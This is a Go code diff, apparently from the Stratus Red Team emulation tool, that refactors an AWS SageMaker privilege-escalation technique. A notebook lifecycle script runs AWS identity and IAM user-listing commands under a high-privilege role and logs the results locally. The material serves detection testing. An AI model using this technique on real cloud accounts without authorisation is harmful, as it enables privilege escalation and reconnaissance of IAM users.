@@ -19,6 +19,13 @@ import (
 
 const configName = "priv-esc-config"
 
+const scriptToExecute = `#!/bin/bash
+set -e
+# Execute a command as the high-privilege role and write output to a log file
+aws sts get-caller-identity >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
+aws iam list-users >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
+`
+
 //go:embed main.tf
 var tf []byte
 var notebookName string
@@ -63,14 +70,7 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 
 	notebookName = params["target_notebook_name"]
 
-	const onStartScript = `#!/bin/bash
-set -e
-# Execute a command as the high-privilege role and write output to a log file
-aws sts get-caller-identity >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
-aws iam list-users >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
-`
-
-	err := CreateNotebookLifecycleConfig(client, configName, onStartScript)
+	err := CreateNotebookLifecycleConfig(client, configName, scriptToExecute)
 	if err != nil {
 		log.Fatalf("Lifecycle config creation failed: %v", err)
 	}
